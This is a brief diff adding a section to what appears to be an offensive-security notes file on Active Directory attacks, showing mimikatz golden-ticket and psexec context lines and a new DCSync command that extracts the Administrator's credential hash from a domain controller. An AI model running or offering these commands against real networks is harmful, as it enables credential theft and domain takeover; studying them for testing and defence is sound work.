@@ -265,3 +265,11 @@ mimikatz # misc::cmd - Launching new cmd prompt with golden ticket injected
 
 psexec.exe \\dc01 cmd.exe
 ```
+
+Synching of domain controllers
+
+```
+lsadump::dcsync /user:Administrator
+
+```
+
